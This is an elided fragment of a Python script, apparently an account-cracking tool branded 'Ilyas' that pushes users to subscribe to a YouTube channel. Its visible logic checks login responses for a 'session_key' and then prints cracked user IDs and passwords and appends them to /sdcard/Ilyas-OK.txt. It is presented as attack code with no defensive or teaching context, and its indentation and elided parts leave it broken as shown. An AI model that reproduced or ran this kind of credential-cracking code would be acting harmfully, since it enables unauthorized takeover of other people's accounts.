...
def CRACKafghan1():
		...
		mthd = input('\033[1;32m[+]CHOOSE: ')
		clear()
		print('\033[1;33m [1] \033[1;33mSUBSCRIBE TO UNLOCK')
		os.system('xdg-open https://youtube.com/@ILYAS_II?si=rIP7M3o7JuX92C8b /')
		linex()
		pcs = input('\033[1;32m[?] SELECT: ')
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [Ilyas-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/Ilyas-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [ILYAS-OK] '+uid+' | '+pas+'\033[1;97m')
